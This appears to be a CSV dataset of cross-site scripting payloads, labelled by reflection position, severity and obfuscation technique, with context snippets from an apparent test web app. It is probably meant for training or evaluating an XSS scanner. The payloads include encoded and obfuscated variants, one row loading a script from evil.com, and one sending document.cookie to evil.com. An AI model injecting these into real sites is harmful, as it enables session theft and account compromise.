payload,payload_with_context,context,severity,source,sink,reflection_position,technique
"<iframe>d.innerHTML+='';</script>//[""'`-->]]>]</div>","<iframe>d.innerHTML+='';</script>//[""'`-->]]>]</div> [position:html_body snippet_context:...rm> </div> <div style=""font-size:.9rem;color:var(--text-secondary)""><iframe>d.innerHTML+='';</scr]",tag_injection,high,,,html_body,mutated
<SCRIPT>alert(	1)</SCRIPT>,<SCRIPT>alert(	1)</SCRIPT> [position:html_body],script_injection,high,,,html_body,obfuscated:tab_newline_inject
"eval(""alert(1)"")","eval(""alert(1)"") [position:script]",dom_sink,low,,,script,original
"document.body.innerHTML=""<img src=x onload=alert(1)>""","document.body.innerHTML=""<img src=x onload=alert(1)>"" [position:none]",dom_sink,high,,,none,mutated
"//"";alert(String.fromCharCode(88,83,83))","//"";alert(String.fromCharCode(88,83,83)) [position:attribute snippet_context:....82rem;color:var(--text-muted);margin-bottom:1rem"">Showing results for: <strong>//"";alert(String.]",tag_injection,high,,,attribute,encoding
' onerror=alert(1) x=',' onerror=alert(1) x=' [position:attribute],attribute_escape,high,,,attribute,original
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:attribute]",attribute_escape,high,,,attribute,mutated
<img/src=x onerror=alert(1)//>,<img/src=x onerror=alert(1)//> [position:html_body],js_uri,high,,,html_body,obfuscated:comment_inject
&quot; onerror=alert(1) x=&quot;,&quot; onerror=alert(1) x=&quot; [position:style],attribute_escape,medium,,,style,original
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:script],template_injection,low,,,script,original
prompt(9),"prompt(9) [position:attribute snippet_context:...ary);margin:.75rem 0"">Click below to continue to your destination.</p> <a href=""prompt(9)"" style=]",tag_injection,medium,,,attribute,none
onload=”alert(‘AnonKryptiQuz’),"onload=”alert(‘AnonKryptiQuz’) [position:attribute snippet_context:...;border:1px solid var(--border);border-radius:6px;padding:1rem;margin:.75rem 0"">onload=”alert(‘An]",tag_injection,medium,,,attribute,none
prompt(9),"prompt(9) [position:attribute snippet_context:...<h2>Page Preview</h2> <form style=""margin-bottom:1rem""><input name=""src"" value=""prompt(9)"" style=]",tag_injection,medium,,,attribute,none
<m\u0061rquee onst\u0061rt=\u0061\u006cert(1)>,<m\u0061rquee onst\u0061rt=\u0061\u006cert(1)> [position:style],event_handler,medium,,,style,obfuscated:unicode_escape
;confirm`1`;,;confirm`1`; [position:comment],attribute_escape,medium,,,comment,mutated
<%= alert(1) %>,<%= alert(1) %> [position:style],template_injection,high,,,style,original
<SCRIPT>confirm(1)</SCRIPT>,<SCRIPT>confirm(1)</SCRIPT> [position:script],script_injection,medium,,,script,mutated
%3Csvg%20onload=alert(%22MrHex88%22)%3E,"%3Csvg%20onload=alert(%22MrHex88%22)%3E [position:attribute snippet_context:...ail: <input id=""reader-email"" name=""email"" value=""""> <br><br> <a href=""%3Csvg%20onload=alert(%22M]",tag_injection,medium,,,attribute,url_encoding
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:attribute]",attribute_escape,low,,,attribute,mutated
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>","""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));> [position:html_body snippet_context:""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111,]",tag_injection,high,,,html_body,encoding
onerror=alert;throw 23;,onerror=alert;throw 23; [position:script snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = 'onerror=alert;thr],tag_injection,low,,,script,none
%3cimg onerror=alert(1) src=a%3e,"%3cimg onerror=alert(1) src=a%3e [position:attribute snippet_context:<!DOCTYPE html><html><head> <meta http-equiv=""refresh"" content=""5;url=%3cimg onerror=alert(1) src=a%]",tag_injection,medium,,,attribute,url_encoding
${alert(1)},${alert(1)} [position:none],template_injection,high,,,none,original
"""><img src=x onerror=confirm(1)>","""><img src=x onerror=confirm(1)> [position:attribute]",attribute_escape,high,,,attribute,mutated
"#""><Svg oNlOAD=ALErt(1)>","#""><Svg oNlOAD=ALErt(1)> [position:attribute snippet_context:....82rem;color:var(--text-muted);margin-bottom:1rem"">Showing results for: <strong>#""><Svg oNlOAD=AL]",attribute_escape,medium,,,attribute,mutated
prompt(9),"prompt(9) [position:attribute snippet_context:...=""avatar"">P</div> <div> <div style=""font-weight:600;font-size:1.1rem"">prompt(9)</div> <div style=]",tag_injection,medium,,,attribute,none
<img src/onerror=alert(1)>,"<img src/onerror=alert(1)> [position:attribute snippet_context:..."">Nexora Member</span></div> </div> </div> <div class=""card"" data-user=""<img src/onerror=alert(1)]",tag_injection,medium,,,attribute,none
<svgonload=alert(1)>,"<svgonload=alert(1)> [position:html_body snippet_context:<svg onload = alert(1) >({""status"": ""ok"", ""message"": ""Nexora API response""});]",tag_injection,medium,,,html_body,none
javascript:confirm(1),javascript:confirm(1) [position:script],js_uri,high,,,script,mutated
onerror=alert;throw 23;,"onerror=alert;throw 23; [position:attribute snippet_context:...ng>Sink:</strong> <code>val</code> inside onclick handler: <code>onclick=""calc('onerror=alert;thr]",tag_injection,low,,,attribute,none
<%= alert(1) %>,<%= alert(1) %> [position:html_body],template_injection,medium,,,html_body,mutated
"<object data=""javascript:alert(1)"">","<object data=""javascript:alert(1)""> [position:script]",attribute_escape,low,,,script,mutated
<svg ^__^>alert(String.fromCharCode(49))</script ^__^,<svg ^__^>alert(String.fromCharCode(49))</script ^__^ [position:attribute snippet_context:...round:var(--bg-0);color:var(--text-primary);padding:2rem} .box{border:2px solid <svg ^__^>alert(S],tag_injection,high,,,attribute,mutated
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));","window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41)); [position:attribute snippet_context:..."">Nexora Member</span></div> </div> </div> <div class=""card"" data-user=""window[""ev"".concat(""al"")]]",tag_injection,high,,,attribute,encoding
\' onerror=confirm(1)//,\' onerror=confirm(1)// [position:script],attribute_escape,low,,,script,mutated
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="")>","<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="")> [position:attribute snippet_context:...iv> <div style=""margin-top:.75rem;font-size:.875rem""> 🔗 <a href=""<Svg Only=1 OnLoad=confirm(atob(]",tag_injection,high,,,attribute,encoding|case_variation
<iframe/onload=alert(0);>,<iframe/onload=alert(0);> [position:html_body],tag_injection,medium,,,html_body,none
<body onload=alert(1)>,<body onload=alert(1)> [position:style],event_handler,high,,,style,original
<svgonload=alert(1)>,<svgonload=alert(1)> [position:attribute snippet_context:...round:var(--bg-0);color:var(--text-primary);padding:2rem} .box{border:2px solid <svg onload = ale],tag_injection,medium,,,attribute,none
"<iframe src=""javascript:alert(1)"">","<iframe src=""javascript:alert(1)""> [position:script]",tag_injection,low,,,script,original
javaScRipt:prompt`1`,javaScRipt:prompt`1` [position:attribute],js_uri,medium,,,attribute,mutated
alert(2),"alert(2) [position:script snippet_context:...ong>Sink:</strong> <code>lang</code> inside JS string: <code>var currentLang = ""alert(2)""</code><]",tag_injection,medium,,,script,none
<script>prompt(1)</script>,<script>prompt(1)</script> [position:script],script_injection,medium,,,script,mutated
<SCRIPT>al'+'ert(1)</SCRIPT>,<SCRIPT>al'+'ert(1)</SCRIPT> [position:script],script_injection,high,,,script,obfuscated:concat_split
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>","</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> [position:attribute snippet_context:...round:var(--bg-0);color:var(--text-primary);padding:2rem} .box{border:2px solid </SCRIPT>"">'><SCR]",tag_injection,high,,,attribute,encoding|case_variation
<SCRIPT src=//evil.com/xss.js></SCRIPT>,<SCRIPT src=//evil.com/xss.js></SCRIPT> [position:script],script_injection,high,,,script,mutated
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-,"+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4- [position:attribute snippet_context:...ref=""/static/style.css""> <style>body{background:var(--bg-0)} .themed{background:+ADw-img src=+ACI]",tag_injection,medium,,,attribute,none
<scRIPt>d.innErHTML+='';</sCRipt>,<scRIPt>d.innErHTML+='';</sCRipt> [position:html_body],tag_injection,high,,,html_body,mutated
innerHTML=location.hash>#<script>alert(1)</script>,innerHTML=location.hash>#<script>alert(1)</script> [position:html_body snippet_context:...<section class=blog-header> <h1>0 search results for 'innerHTML=location.hash>#<script>alert(1)</],tag_injection,high,,,html_body,none
innerHTML=location.hash>#<script>alert(1)</script>,"innerHTML=location.hash>#<script>alert(1)</script> [position:attribute snippet_context:...ng>Sink:</strong> <code>val</code> inside onclick handler: <code>onclick=""calc('innerHTML=locatio]",tag_injection,high,,,attribute,none
%3Cimg%20src=x%20onerror=alert(%22MrHex88%22)%3E,"%3Cimg%20src=x%20onerror=alert(%22MrHex88%22)%3E [position:attribute snippet_context:...ail: <input id=""reader-email"" name=""email"" value=""""> <br><br> <a href=""%3Cimg%20src=x%20onerror=a]",tag_injection,medium,,,attribute,url_encoding
{{7*7}},{{7*7}} [position:style],template_injection,high,,,style,obfuscated:mixed_case
onerror='alert(1)',"onerror='alert(1)' [position:attribute snippet_context:..."">Nexora Member</span></div> </div> </div> <div class=""card"" data-user=""onerror='alert(1)'""> <div]",tag_injection,medium,,,attribute,none
prompt(9),"prompt(9) [position:attribute snippet_context:...;border:1px solid var(--border);border-radius:6px;padding:1rem;margin:.75rem 0"">prompt(9)</div> <]",tag_injection,medium,,,attribute,none
&quot; onerror=alert(1) x=&quot;,&quot; onerror=alert(1) x=&quot; [position:script],attribute_escape,low,,,script,obfuscated:hex_escape
' \x3e\x3cimg src=x onerror=alert(1)\x3e,' \x3e\x3cimg src=x onerror=alert(1)\x3e [position:attribute],attribute_escape,low,,,attribute,obfuscated:hex_escape
"""><svg onload=alert()>","""><svg onload=alert()> [position:attribute snippet_context:<!DOCTYPE html><html><head> <meta http-equiv=""refresh"" content=""5;url=""><svg onload=alert()>""> <link]",tag_injection,medium,,,attribute,none
javascript:alert(document.domain),javascript:alert(document.domain) [position:attribute],js_uri,high,,,attribute,original
<%= alert(1) %>,<%= alert(1) %> [position:script],template_injection,high,,,script,obfuscated:comment_inject
%3cimg onerror=alert(1) src=a%3e,"%3cimg onerror=alert(1) src=a%3e [position:attribute snippet_context:<!DOCTYPE html><html><head> <meta http-equiv=""refresh"" content=""5;url=%3cimg onerror=alert(1) src=a%]",tag_injection,medium,,,attribute,url_encoding
confirm(),"confirm() [position:attribute snippet_context:...<h2>Page Preview</h2> <form style=""margin-bottom:1rem""><input name=""src"" value=""confirm()"" style=]",tag_injection,medium,,,attribute,none
"eval(""alert(1)"")","eval(""alert(1)"") [position:script]",dom_sink,high,,,script,original
"?alert(1)"",","?alert(1)"", [position:attribute snippet_context:...g> <code>color</code> param in unquoted attribute: <code>style=background-color:?alert(1)"",</code]",tag_injection,medium,,,attribute,none
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));","window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41)); [position:attribute snippet_context:...-radius:6px;cursor:pointer;margin-left:.5rem"">Load</button></form> <iframe src=""window[""ev"".conca]",tag_injection,high,,,attribute,encoding
' onerror=alert(1) x=',' onerror=alert(1) x=' [position:script],dom_sink,high,,,script,original
"setTimeout(""alert(1)"",0)","setTimeout(""alert(1)"",0) [position:script]",dom_sink,medium,,,script,mutated
<body onload=alert(1)>,<body onload=alert(1)> [position:none],event_handler,medium,,,none,original
"<object data=""javascript:confirm(1)"">","<object data=""javascript:confirm(1)""> [position:script]",js_uri,medium,,,script,mutated
#{alert(1)},#{alert(1)} [position:script],template_injection,low,,,script,obfuscated:html_entity
"""><svg onmouseenter=alert(1)>","""><svg onmouseenter=alert(1)> [position:attribute snippet_context:...g> <code>color</code> param in unquoted attribute: <code>style=background-color:""><svg onmouseent]",attribute_escape,medium,,,attribute,mutated
<script>confirm(document.domain)</script>,<script>confirm(document.domain)</script> [position:script],script_injection,medium,,,script,mutated
"<object data=""javascript:alert(1)"">","<object data=""javascript:alert(1)""> [position:script]",tag_injection,low,,,script,original
<img src/onerror=prompt(8)>,<img src/onerror=prompt(8)> [position:dom snippet_context:8],tag_injection,medium,,,dom,none
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>","<script>document.location=""http://evil.com/?c=""+document.cookie</script> [position:script]",script_injection,high,,,script,original
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:html_body],tag_injection,medium,,,html_body,mutated
javascript:alert(document.domain),javascript:alert(document.domain) [position:style],js_uri,low,,,style,original
javascript:alert(1),javascript:alert(1) [position:attribute],attribute_escape,medium,,,attribute,original
j\u0061v\u0061script:\u0061\u006cert(1),j\u0061v\u0061script:\u0061\u006cert(1) [position:script],js_uri,high,,,script,obfuscated:unicode_escape
<svgonload=alert(1)>,<svgonload=alert(1)> [position:dom snippet_context:1],tag_injection,medium,,,dom,none
嘼img src=1 onerror=alert(1)嘾,"嘼img src=1 onerror=alert(1)嘾 [position:script snippet_context:...ong>Sink:</strong> <code>lang</code> inside JS string: <code>var currentLang = ""嘼img src=1 onerro]",tag_injection,medium,,,script,none
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>","<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT> [position:attribute snippet_context:...ng>Sink:</strong> <code>val</code> inside onclick handler: <code>onclick=""calc('<SCRIPT>String.fr]",tag_injection,high,,,attribute,encoding|case_variation
<;BODY ONLOAD=alert(';XSS';)>;,"<;BODY ONLOAD=alert(';XSS';)>; [position:attribute snippet_context:<!DOCTYPE html><html><head> <meta http-equiv=""refresh"" content=""5;url=<;BODY ONLOAD=alert(';XSS';)>;]",tag_injection,medium,,,attribute,none
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--","confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//-- [position:attribute snippet_context:..."">Nexora Member</span></div> </div> </div> <div class=""card"" data-user=""confirm(String.fromCharCo]",tag_injection,high,,,attribute,encoding
<svgonload=alert(1)>,"<svgonload=alert(1)> [position:html_body snippet_context:...gin-bottom:.75rem"">Bio</div> <div style=""font-size:.925rem;line-height:1.7""><svg onload = alert(1]",tag_injection,medium,,,html_body,none
